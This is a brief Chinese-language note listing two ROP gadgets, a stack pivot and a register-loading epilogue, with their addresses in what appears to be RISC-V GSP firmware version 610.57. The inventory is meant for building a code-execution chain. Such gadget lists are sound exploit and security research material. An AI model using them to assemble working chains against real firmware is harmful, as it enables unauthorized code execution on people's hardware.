# GSP 610.57 Gadget 库存(为 GSP-exec ROP 链)

## Stack pivot(1 个)

- `0x1b70ad8`: `addi sp, a0, 0x270 ; divuw a5, a0, a4 ; bgeu a1, a5, 0x3a ; subw a1, a5, a1 ; bltu a1, a6, 6 ; c.mv a4, a3 ; c.sw a4, 0(a2) ; c.jr ra`


## 多 a-寄存器 + ra epilogue(1 个,前 40)

- `0x12a210c` [a0,a1]: `ld a1, -0x20(s0) ; ld a0, -0x18(s0) ; c.ldsp s0, 0x10(sp) ; c.ldsp ra, 0x18(sp) ; ld a5, 0x210(a1) ; c.addi16sp sp, 0x20`

